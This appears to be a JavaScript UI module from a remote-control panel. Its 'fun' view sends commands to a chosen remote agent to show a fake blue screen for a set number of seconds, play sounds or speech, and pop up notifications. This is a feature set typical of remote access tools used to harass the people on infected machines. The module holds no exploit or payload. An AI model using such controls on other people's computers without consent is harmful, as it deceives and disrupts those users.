import { $, on } from "../lib/dom.js";
import { api } from "../lib/api.js";

export function createFunView(root, context) {
  const error = $("#fun-err", root);
  const bsodSeconds = $("#bsod-sec", root);
  const soundKind = $("#sound-kind", root);
  const soundText = $("#sound-text", root);
  const notifyTitle = $("#ntf-title", root);
  const notifyBody = $("#ntf-body", root);

  async function fire(task) {
    const id = context.agentId();
    if (!id) return;

    error.textContent = "";

    try {
      await task(id);
    } catch (failure) {
      error.textContent = failure.message;
    }
  }

  on($("#btn-bsod", root), "click", () => fire((id) => api.bsod(id, bsodSeconds.value || 15)));
  on($("#btn-sound", root), "click", () => fire((id) => api.sound(id, soundKind.value, soundText.value)));
  on($("#btn-notify", root), "click", () =>
    fire((id) => api.notify(id, notifyTitle.value, notifyBody.value)),
  );

  return { activate: () => {}, deactivate: () => {} };
}
